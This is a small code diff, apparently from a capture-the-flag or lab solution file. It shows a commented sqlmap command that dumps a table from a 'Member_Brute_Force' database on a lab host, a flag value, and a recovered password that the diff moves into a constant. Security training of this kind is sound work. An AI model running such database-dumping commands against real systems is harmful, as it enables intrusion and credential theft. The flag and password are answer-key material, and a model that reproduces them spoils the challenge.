@@ -34,5 +34,5 @@
 
 
 # sqlmap -u "http://10.100.52.65:20930/?page=member&id=100&Submit=Submit#" -D Member_Brute_Force -T db_default --dump --flush-session
-# password: onelovebigman
 FLAG01 = "651fc3e633255fe2ef606da894ac218d"
+PASSWORD = "onelovebigman"
